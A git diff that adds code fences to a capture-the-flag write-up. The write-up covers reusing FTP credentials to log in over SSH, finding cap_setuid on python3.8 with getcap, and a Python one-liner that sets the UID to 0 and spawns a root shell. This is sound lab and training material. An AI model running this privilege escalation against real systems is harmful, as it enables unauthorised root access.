@@ -43,8 +43,9 @@ This highlights the insecurity of FTP, where credentials are transmitted without
 
 The recovered credentials were reused to authenticate via SSH:
 
+```
 ssh nathan@10.10.X.X
-
+```
 Successful login confirmed credential reuse across services.
 
 ⸻
@@ -53,7 +54,10 @@ Successful login confirmed credential reuse across services.
 
 System enumeration was performed to identify potential escalation vectors:
 
+```
 getcap -r / 2>/dev/null
+```
+
 This revealed:
 /usr/bin/python3.8 = cap_setuid+ep
 
@@ -62,10 +66,14 @@ The cap_setuid capability allows the binary to change its effective user ID, whi
 🚨 Exploitation
 
 Python was used to escalate privileges by setting the UID to root:
+
+```
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
 Verification:
-id
+
+# id
 uid=0(root)
 
 🏁 Root Access
